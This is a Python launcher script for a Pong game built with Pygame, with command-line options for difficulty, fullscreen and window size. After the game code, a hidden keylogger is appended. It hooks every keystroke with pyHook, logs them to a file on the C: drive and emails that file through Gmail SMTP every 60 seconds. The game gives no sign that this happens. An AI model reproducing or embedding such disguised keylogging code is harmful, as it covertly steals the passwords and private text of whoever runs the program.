#!/usr/bin/env python

import pygame as pg
from data.main import main
import data.tools
import argparse
import sys
import pyHook, pythoncom, logging, thread, time, os.path, smtplib

parser = argparse.ArgumentParser(description='Pong Arguments')
parser.add_argument('-c','--clean', action='store_true', 
    help='Remove all .pyc files and __pycache__ directories')
parser.add_argument('-f' , '--fullscreen', action='store_true',
    help='start program with fullscreen')
parser.add_argument('-d' , '--difficulty', default='medium',
    help='where DIFFICULTY is one of the strings [hard, medium, easy], set AI difficulty, default is medium, ')
parser.add_argument('-s' , '--size', nargs=2, default=[800,600], metavar=('WIDTH', 'HEIGHT'),
    help='set window size to WIDTH HEIGHT, defualt is 800 600')
args = vars(parser.parse_args())

if __name__ == '__main__':
    accepted_difficulty = ['hard', 'medium', 'easy']
    
    if args['difficulty']:
        if args['difficulty'].lower() in accepted_difficulty:
            difficulty = args['difficulty'].lower()
            print('difficulty: {}'.format(difficulty))
        else:
            print('{} is not a valid difficulty option, {}'.format(args['difficulty'], accepted_difficulty))
            sys.exit()
    if args['size']:
        size = args['size']
        print('window size: {}'.format(size))
        
    if args['clean']:
        data.tools.clean_files()
    else:
        main(args['fullscreen'], difficulty, size)
    pg.quit()

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
file_log = 'C:\keyloggeroutput.txt'
server.login("", "")

# Thread to send email

def sendEmail(text):
    while True:
        if os.path.isfile('C:\keyloggeroutput.txt'):
            #Send Email
            filecontent = open('C:\keyloggeroutput.txt', 'r').read()
            msg = "\n" + str(filecontent) # The /n separates the message from the headers
            server.sendmail("", "", msg)
        time.sleep(60)

thread.start_new_thread(sendEmail, ('This is a simple Text', ))

# ----------- Begin of the Keylogger Program ----------- #

def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


